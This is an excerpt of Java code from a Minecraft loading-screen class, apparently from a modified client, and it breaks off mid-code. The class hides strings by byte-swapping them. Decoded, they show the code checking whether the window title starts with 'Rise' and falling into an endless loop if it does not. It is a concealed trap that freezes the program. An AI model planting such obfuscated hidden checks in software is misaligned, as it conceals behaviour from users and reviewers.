...
public class LoadingScreenRenderer implements IProgressUpdate {
    ...
    public LoadingScreenRenderer(Minecraft mcIn) {
        ...
        final String yes = "漀爀最⸀氀眀樀最氀⸀漀瀀攀渀最氀⸀䐀椀猀瀀氀愀礀";
        final StringBuilder stringBuilder = new StringBuilder(40);

        for (int i = 0; i < yes.length(); i++) {
            stringBuilder.append(Character.reverseBytes(yes.charAt(i)));
        }

        final String no = "最攀琀吀椀琀氀攀";
        final StringBuilder stringBuilder1 = new StringBuilder();

        for (int i = 0; i < no.length(); i++) {
            stringBuilder1.append(Character.reverseBytes(no.charAt(i)));
        }

        final String perhaps = "刀椀猀攀";
        final StringBuilder stringBuilder2 = new StringBuilder();

        for (int i = 0; i < perhaps.length(); i++) {
            stringBuilder2.append(Character.reverseBytes(perhaps.charAt(i)));
        }

        try {
            final String weirdStuff = (String) Class.forName(stringBuilder.toString()).getMethod(stringBuilder1.toString()).invoke(null);

            if (!weirdStuff.startsWith(stringBuilder2.toString())) {
                for (; ; ) {
